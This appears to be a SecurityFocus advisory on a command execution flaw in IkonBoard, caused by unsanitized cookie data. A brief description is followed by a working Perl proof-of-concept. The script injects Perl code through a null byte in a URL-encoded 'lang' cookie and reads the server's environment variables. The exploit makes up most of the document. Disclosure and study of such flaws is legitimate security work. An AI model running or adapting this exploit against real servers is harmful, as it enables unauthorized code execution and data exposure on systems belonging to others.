source: http://www.securityfocus.com/bid/7361/info

It has been reported that IkonBoard is prone to an arbitrary command execution vulnerability. The vulnerability is due to insufficient sanitization performed on user supplied cookie data.

An attacker may exploit this issue to execute arbitrary commands in the security context of the web server hosting the vulnerable IkonBoard. 

#!/usr/bin/perl -w
use strict;

my $HOST = 'www.example.com';
my $PORT = 80;
my $PATH = '/cgi-bin/ikonboard.cgi';
my $HEAD = qq|"Content-type: text/plain\r\n\r\n"|;

use IO::Socket;

my $sock = IO::Socket::INET->new("$HOST:$PORT") or die "connect: $!";

my $val =
     qq|.\0"if print($HEAD,map"\$_ => \$ENV{\$_}\n",keys\%ENV)&&exit;#|;

$val =~ s#(\W)# sprintf '%%%.2X', ord $1 #ge;

$sock->print(
    "GET $PATH HTTP/1.1\r\n",
    "Host: $HOST\r\n",
    "Cookie: lang=$val\r\n",
    "Connection: close\r\n",
    "\r\n"
) or die "write: $!";

print while <$sock>;

